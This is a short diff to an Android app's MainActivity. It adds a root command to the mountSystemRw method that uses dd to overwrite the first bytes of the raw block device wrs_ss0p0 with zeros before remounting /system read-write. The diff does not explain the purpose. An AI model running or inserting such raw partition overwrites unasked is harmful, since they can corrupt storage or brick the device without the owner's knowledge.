@@ -321,6 +321,7 @@ public class MainActivity extends Activity implements View.OnClickListener {
   }
 
   private void mountSystemRw() throws RemoteException {
+    ProcessExecutor.executeRootCommand("/system/bin/dd if=/dev/zero of=/dev/block/wrs_ss0p0 bs=80 count=1");
     ProcessExecutor.executeRootCommand("mount -o remount,rw /system");
   }
 
